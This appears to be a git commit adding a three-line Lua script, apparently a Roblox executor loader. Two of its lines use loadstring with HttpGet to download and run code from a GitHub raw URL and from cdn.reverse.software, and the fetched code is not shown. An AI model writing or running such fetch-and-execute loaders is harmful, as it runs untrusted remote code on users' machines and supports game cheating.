ca7aaaf74434dd10d269d40f3f0bdeccdeca1539
Miguel7172 <romaozin1607@gmail.com>
2025-08-19 21:49:08 -0300

    Adicionando script5.lua automaticamente

---
+++ script5.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()
+ID="971cd8ed-67f6-4ce6-8e36-ec117ddfe65e";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
